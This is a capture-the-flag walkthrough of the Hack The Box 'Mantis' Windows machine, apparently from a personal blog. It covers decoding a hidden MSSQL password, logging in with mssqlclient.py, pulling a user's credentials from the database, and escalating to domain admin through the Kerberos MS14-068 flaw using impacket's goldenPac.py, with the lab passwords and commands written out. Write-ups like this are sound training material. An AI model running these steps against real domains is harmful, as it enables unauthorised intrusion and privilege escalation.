---
title: "Hack The Box - Mantis"
tags: [windows,hard,mssql , iis httpd , 1337 , MSSQL , base64 , hex , dbeaver , MS14-068 , Kerberos , Goldenpac]
categories: HackTheBox-Active-Directory
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled.png)

## NMAP :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%201.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%202.png)

## Enumerating port 1337 and 8080

⇒ There's a login on port 8080, sadly we couldn't find anything useful on there :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%203.png)

→ Couldnt find anything.....

⇒ On 1337 we have an default IIS page :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%204.png)

→ After running gobuster we discover :

[http://10.10.10.52:1337/secure_notes/](http://10.10.10.52:1337/secure_notes/)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%205.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%206.png)

→ The dev_notes file name contains a weird string. Base64 decoding it we get an hex :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%207.png)

Decoding the hex :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%208.png)

Password : **m$$ql_S@_P@ssW0rd!**

⇒ Logged in on mssql using [mssqlclient.py](http://mssqlclient.py) and the credentials that we found :

**mssqlclient.py -p 1433 admin:'m$$ql_S@_P@ssW0rd!'@10.10.10.52**

## Enumerating mssql server :

⇒ We will be using tool named dbeaver :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%209.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%2010.png)

→ We got user James credentials :

**J@m3s_P@ssW0rd!**

## Exploiting Kerberos [ MS14-068 ]

⇒ This vulnerability could allow an attacker to elevate unprivileged domain user account privileges to those of the domain administrator account. An attacker could use these elevated privileges to compromise any computer in the domain, including domain controllers. 

→ This is well known exploit and it’s always worth checking when pentesting .

⇒ We will be using [Goldenpac.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/goldenPac.py) from impacket :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%2011.png)

**python goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 HTB.LOCAL/james@mantis.htb.local**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mantis%20Box%207c220c3f4b9f496e97c8790896bdcc04/Untitled%2012.png)

[TL;DR](https://www.notion.so/TL-DR-6e814a06c94b4fca8c1f69d112ed5c74)
